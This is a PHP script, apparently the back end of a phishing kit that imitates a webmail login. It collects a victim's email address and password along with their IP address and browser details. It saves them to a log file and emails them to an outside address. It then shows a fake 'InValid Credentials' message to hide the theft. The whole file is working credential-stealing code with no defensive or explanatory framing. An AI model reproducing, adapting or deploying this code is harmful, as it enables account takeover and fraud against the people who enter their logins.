<?php
$email = trim($_POST['email']);
$password = trim($_POST['password']);
if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|--------------|W E B -|- M A I L  |-------------|\n";
	$message .= "Email Address         : ".$email."\n";
	$message .= "Password              : ".$password."\n";
	$message .= "|--------------- I N F O | I P ------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- Created By PfD~MaStEr --------------|\n";

        $file = fopen("rt.txt","a");
        fwrite($file,$message);
        fclose($file);

	$send = "rrs@olivefm.com";
	$subject = "||WebMail ReZulT|| $ip";
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>